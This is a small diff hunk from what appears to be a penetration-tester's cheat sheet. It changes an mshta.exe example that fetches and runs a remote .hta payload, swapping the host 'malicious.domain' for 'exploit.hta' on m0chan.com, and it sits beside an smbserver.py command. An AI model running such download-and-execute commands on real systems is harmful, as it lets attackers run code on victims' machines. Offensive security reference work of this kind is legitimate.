@@ -664,8 +664,7 @@ python smbserver.py Share `pwd` -u m0chan -p m0chan --smb-2support
 
 mshta.exe is a default binary shipped on all versions of Windows which allows the execution of .hta payloads
 
-mshta.exe https://malicious.domain/runme.hta
-
+mshta.exe https://m0chan.com/exploit.hta
 
 ```
 
